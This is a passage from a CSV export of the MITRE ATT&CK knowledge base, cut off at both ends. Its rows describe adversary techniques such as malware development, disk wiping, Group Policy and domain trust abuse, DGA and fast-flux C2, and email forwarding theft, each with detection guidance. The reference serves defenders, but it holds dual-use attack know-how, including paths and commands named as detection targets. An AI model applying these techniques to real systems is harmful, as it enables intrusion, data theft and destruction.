Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,,True,T1587,,,,,,,,","
T1587.001,attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0,Develop Capabilities: Malware,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)

As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.

Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",https://attack.mitre.org/techniques/T1587/001,01 October 2020,14 January 2022,enterprise-attack,1.2,Resource Development,"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",PRE,"Malware Repository: Malware Content, Malware Repository: Malware Metadata",True,T1587,,,,,,,,"(Citation: Mandiant No Easy Breach),(Citation: ESET Lazarus Jun 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: F-Secure The Dukes),(Citation: CISA AppleJeus Feb 2021),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: BlackBerry CostaRicto November 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: Cylance Cleaver),(Citation: FireEye FIN7 Oct 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: Bitdefender LuminousMoth July 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Kaspersky LuminousMoth July 2021),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: Unit 42 Hildegard Malware),(Citation: KISA Operation Muzabi),(Citation: McAfee Lazarus Jul 2020),(Citation: ESET Dukes October 2019),(Citation: McAfee Sharpshooter December 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Mandiant FIN13 Aug 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FBI Flash FIN7 USB),(Citation: Google TAG Lazarus Jan 2021),(Citation: Recorded Future Turla Infra 2020),(Citation: Sygnia Elephant Beetle Jan 2022),"
T1561.001,attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac,Disk Wipe: Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.

Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1561/001,20 February 2020,12 April 2023,enterprise-attack,1.0,Impact,"Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.

For network infrastructure devices, collect AAA logging to monitor for `erase` commands that delete critical configuration files.","Linux, Windows, macOS","Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation",True,T1561,,,,,,Availability,,"(Citation: Medium S2W WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Symantec Elfin Mar 2019),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Crowdstrike WhisperGate January 2022),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: IBM MegaCortex),(Citation: Microsoft BlackCat Jun 2022),(Citation: Sophos BlackCat Jul 2022),(Citation: Ready.gov IT DRP)"
T1561.002,attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9,Disk Wipe: Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. 

Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.

On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)

To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",https://attack.mitre.org/techniques/T1561/002,20 February 2020,14 April 2023,enterprise-attack,1.1,Impact,"Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.

For network infrastructure devices, collect AAA logging to monitor for `format` commands being run to erase the file structure and prevent recovery of the device.","Linux, Network, Windows, macOS","Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation",True,T1561,,"Austin Clark, @c2defense",,,,Availability,,"(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET CaddyWiper March 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Symantec Elfin Mar 2019),(Citation: Cisco CaddyWiper March 2022),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Talos Group123),(Citation: FireEye APT37 Feb 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: FireEye APT38 Oct 2018),(Citation: Unit 42 Shamoon3 2018),(Citation: Novetta Blockbuster),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: ESET Telebots June 2017),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Symantec Ukraine Wipers February 2022),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: Microsoft WhisperGate January 2022),(Citation: Cybereason WhisperGate February 2022),(Citation: Symantec Shamoon 2012),(Citation: US-CERT Ukraine Feb 2016),(Citation: Trend Micro KillDisk 1),(Citation: FireEye Shamoon Nov 2016),(Citation: Ready.gov IT DRP)"
T1484.002,attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee,Domain Policy Modification: Domain Trust Modification,"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.

Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) ",https://attack.mitre.org/techniques/T1484/002,28 December 2020,21 October 2022,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)

Monitor for PowerShell commands such as: <code>Update-MSOLFederatedDomain –DomainName: ""Federated Domain Name""</code>, or <code>Update-MSOLFederatedDomain –DomainName: ""Federated Domain Name"" –supportmultipledomain</code>.(Citation: Microsoft - Update or Repair Federated domain)","Azure AD, Windows","Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Command: Command Execution",True,T1484,,"Blake Strom, Microsoft 365 Defender; Praetorian",Administrator,,,,,"(Citation: Secureworks IRON RITUAL Profile),(Citation: Azure AD Federation Vulnerability),(Citation: AADInternals Documentation),(Citation: Microsoft 365 Defender Solorigate),"
T1484.001,attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163,Domain Policy Modification: Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) 

Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.

Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)

For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",https://attack.mitre.org/techniques/T1484/001,28 December 2020,06 January 2023,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:

* Event ID 5136 - A directory service object was modified
* Event ID 5137 - A directory service object was created
* Event ID 5138 - A directory service object was undeleted
* Event ID 5139 - A directory service object was moved
* Event ID 5141 - A directory service object was deleted


GPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).",Windows,"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Command: Command Execution",True,T1484,,"Itamar Mizrahi, Cymptom; Tristan Bennett, Seamless Intelligence","Administrator, User",,,,,"(Citation: Intrinsec Egregor Nov 2020),(Citation: Cybereason Egregor Nov 2020),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Check Point Meteor Aug 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: Crowdstrike Indrik November 2018),(Citation: Github PowerShell Empire),(Citation: Microsoft GPO Security Filtering),(Citation: GitHub Bloodhound),(Citation: Microsoft WMI Filters),(Citation: Wald0 Guide to GPOs)"
T1568.003,attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1,Dynamic Resolution: DNS Calculation,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)

One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)",https://attack.mitre.org/techniques/T1568/003,11 March 2020,27 March 2020,enterprise-attack,1.0,Command and Control,Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.,"Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1568,,,,,,,,"(Citation: Meyers Numbered Panda),"
T1568.002,attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd,Dynamic Resolution: Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",https://attack.mitre.org/techniques/T1568/002,10 March 2020,11 March 2022,enterprise-attack,1.0,Command and Control,"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.

Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)","Linux, Windows, macOS",Network Traffic: Network Traffic Flow,True,T1568,,"Barry Shteiman, Exabeam; Ryan Benson, Exabeam; Sylvain Gil, Exabeam",User,,,,,"(Citation: FireEye POSHSPY April 2017),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: ESET Ebury Oct 2017),(Citation: ProofPoint Ursnif Aug 2016),(Citation: FireEye APT34 Dec 2017),(Citation: SANS Conficker),(Citation: ESET Sednit 2017 Activity),(Citation: Intezer Doki July 20),(Citation: Securelist ShadowPad Aug 2017),(Citation: Zdnet Ngrok September 2018),(Citation: FireEye APT41 Aug 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Accenture Lyceum Targets November 2021),(Citation: Talos CCleanup 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: ESET Ebury Feb 2014),(Citation: CheckPoint Naikon May 2020),(Citation: Trend Micro Conficker),(Citation: ClearSky Siamesekitten August 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cybereason Bazar July 2020),(Citation: ESET Dukes October 2019),(Citation: Unit 42 TA551 Jan 2021),(Citation: Secureworks GOLD CABIN),(Citation: Prevailion DarkWatchman 2021),(Citation: Cisco Umbrella DGA Brute Force),(Citation: Cybereason Dissecting DGAs),(Citation: Akamai DGA Mitigation)"
T1568.001,attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6,Dynamic Resolution: Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)

The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)

In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",https://attack.mitre.org/techniques/T1568/001,11 March 2020,27 March 2020,enterprise-attack,1.0,Command and Control,"In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1568,,,,,,,,"(Citation: Korean FSI TA505 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Gh0stRAT ATT March 2019),(Citation: Trend Micro njRAT 2018),(Citation: Trend Micro TA505 June 2019),"
T1114.003,attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0,Email Collection: Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)

In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ",https://attack.mitre.org/techniques/T1114/003,19 February 2020,12 April 2023,enterprise-attack,1.3,Collection,"Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)

Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","Google Workspace, Linux, Office 365, Windows, macOS","Application Log: Application Log Content, Command: Command Execution",True,T1114,,"Liran Ravich, CardinalOps; Microsoft Security; Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)",,,,,,"(Citation: CISA AA20-301A Kimsuky),(Citation: DOJ Iran Indictments March 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft BEC Campaign),(Citation: Microsoft Manage Mail Flow Rules 2023),(Citation: Pfammatter - Hidden Inbox Rules),(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2),(Citation: Microsoft Get-InboxRule)"
T1114.001,attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004,Email Collection: Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.

Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.(Citation: Microsoft Outlook Files)",https://attack.mitre.org/techniques/T1114/001,19 February 2020,24 March 2020,enterprise-attack,1.0,Collection,Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).,Windows,"Command: Command Execution, File: File Access",True,T1114,,,User,,,,,"(Citation: Talos Smoke Loader July 2018),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye CARBANAK June 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: NCC Group Chimera January 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant APT1),(Citation: Trend Micro Muddy Water March 2021),(Citation: Kroll Qakbot June 2020),(Citation: F-Secure Cosmicduke),(Citation: GitHub Pupy),(Citation: McAfee Night Dragon),(Citation: CIS Emotet Dec 2018),(Citation: Github PowerShell Empire),(Citation: Trend Micro Qakbot December 2020),(Citation: FireEye APT35 2018),"
T1114.002,attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a,Email Collection: Remote Email Collection,"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",https://attack.mitre.org/techniques/T1114/002,19 February 2020,31 May 2023,enterprise-attack,1.2,Collection,"Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).","Google Workspace, Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation",True,T1114,,,,,,,,"(Citation: NCC Group Chimera January 2021),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Mandiant APT1),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: GitHub MailSniper),(Citation: Microsoft HAFNIUM March 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Leafminer July 2018),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Cybereason Valak May 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: KISA Operation Muzabi),(Citation: Volexity Exchange Marauder March 2021),(Citation: US-CERT TA18-074A),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Microsoft NICKEL December 2021),(Citation: DFIR Phosphorus November 2021),(Citation: Symantec Seaduke 2015),(Citation: Volexity SolarWinds),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: ESET LightNeuron May 2019),"
T1573.002,attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada,Encrypted Channel: Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.

For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",https://attack.mitre.org/techniques/T1573/002,16 March 2020,20 April 2021,enterprise-attack,1.0,Command and Control,"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1573,,,,,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: CISA WellMess July 2020),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: IBM IcedID November 2017),(Citation: Zscaler Bazar September 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Mandiant APT41),(Citation: Group IB GrimAgent July 2021),(Citation: Github PowerShell Empire),(Citation: Blasco 2013),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: NCSC APT29 July 2020),(Citation: ESET Kobalos Jan 2021),(Citation: Invincea XTunnel),(Citation: ESET Attor Oct 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: PWC WellMess July 2020),(Citation: Kaspersky Dridex May 2017),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: FireEye MuddyWater Mar 2018),(Citation: Talos Promethium June 2020),(Citation: Dingledine Tor The Second-Generation Onion Router),(Citation: Cylance Machete Mar 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub Sliver Encryption),(Citation: Mythc Documentation),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Mandiant APT1 Appendix),(Citation: Talos PoetRAT April 2020),(Citation: ESET Zebrocy Nov 2018),(Citation: FireEye FiveHands April 2021),(Citation: Securelist APT10 March 2021),(Citation: Talos TinyTurla September 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Fidelis Hi-Zor),(Citation: Secureworks Karagany July 2019),(Citation: Intezer Doki July 20),(Citation: SecureWorks WannaCry Analysis),(Citation: ESET 